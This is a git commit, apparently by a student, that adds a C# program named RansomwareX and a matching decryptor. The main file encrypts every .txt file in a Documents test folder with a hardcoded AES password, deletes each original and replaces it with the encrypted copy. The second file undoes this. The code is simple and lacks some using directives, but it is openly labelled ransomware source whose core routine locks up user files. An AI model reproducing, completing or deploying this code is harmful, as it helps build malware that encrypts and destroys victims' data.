0354fcd708b880ed0f502c855874ec33c98c19cb
NightMatt123 <matthew.devensen@binus.ac.id>
2024-05-20 20:41:55 +0700

    Ransom

---
+++ ransom/Program.cs
@@ -0,0 +1,29 @@
+﻿using System;
+using SharpAESCrypt;
+
+namespace RansomwareX
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string dir = @"C:\Users\123\Documents\Tes";
+            List<string> files = new List<string>();
+            DirectoryInfo d = new DirectoryInfo(dir);
+
+            foreach (var file in d.GetFiles("*.txt"))
+            {
+                files.Add(file.ToString());
+            }
+
+            foreach (string file in files)
+            {
+                string encrypted_file = dir + "encrypted_file.txt";
+                SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encrypted_file);
+                File.Delete(file);
+                File.Move(encrypted_file, file);
+
+            }
+        }
+    }
+}
---
+++ ransom/ProgramDecrypt.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using SharpAESCrypt;
+
+namespace RansomwareX
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string dir = @"C:\Users\123\Documents\Tes";
+            List<string> files = new List<string>();
+            DirectoryInfo d = new DirectoryInfo(dir);
+
+            foreach (var file in d.GetFiles("*.txt"))
+            {
+                files.Add(file.ToString());
+            }
+
+            foreach (string file in files)
+            {
+                string decrypted_file = dir + "crypted_file.txt";
+                SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decrypted_file);
+                File.Delete(file);
+                File.Move(decrypted_file, file);
+            }
+        }
+    }
+}
